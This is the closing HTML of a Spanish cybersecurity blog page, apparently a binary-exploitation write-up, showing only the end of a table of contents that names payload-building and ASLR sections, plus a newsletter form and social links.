href="#creando-espacio-para-el-_payload_">Creando espacio para el <em>payload</em></a></li><li><a href="#construyendo-el-_payload_">Construyendo el <em>payload</em></a></li><li><a href="#perfeccionando-el-_payload_">Perfeccionando el <em>payload</em></a></li><li><a href="#activación-de-aslr">Activación de ASLR</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electrónico" name="email" id="tlemail">
<input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Submit"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="TinyLetter">TinyLetter</a></p><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>